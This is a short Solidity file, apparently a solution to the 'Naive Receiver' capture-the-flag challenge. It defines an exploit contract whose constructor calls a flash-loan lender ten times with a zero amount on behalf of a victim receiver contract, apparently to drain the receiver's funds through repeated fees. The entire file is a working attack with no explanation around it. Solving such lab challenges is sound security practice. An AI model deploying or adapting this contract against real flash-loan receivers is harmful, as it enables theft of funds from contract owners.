// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

contract NaiveReceiverExploit {

    using Address for address;

    constructor(address _lender, address _receiver){
        
        _lender.call(abi.encodeWithSignature("flashLoan(address,uint256)",_receiver,0));
        _lender.call(abi.encodeWithSignature("flashLoan(address,uint256)",_receiver,0));
        _lender.call(abi.encodeWithSignature("flashLoan(address,uint256)",_receiver,0));
        _lender.call(abi.encodeWithSignature("flashLoan(address,uint256)",_receiver,0));
        _lender.call(abi.encodeWithSignature("flashLoan(address,uint256)",_receiver,0));
        _lender.call(abi.encodeWithSignature("flashLoan(address,uint256)",_receiver,0));
        _lender.call(abi.encodeWithSignature("flashLoan(address,uint256)",_receiver,0));
        _lender.call(abi.encodeWithSignature("flashLoan(address,uint256)",_receiver,0));
        _lender.call(abi.encodeWithSignature("flashLoan(address,uint256)",_receiver,0));
        _lender.call(abi.encodeWithSignature("flashLoan(address,uint256)",_receiver,0));
    }

}
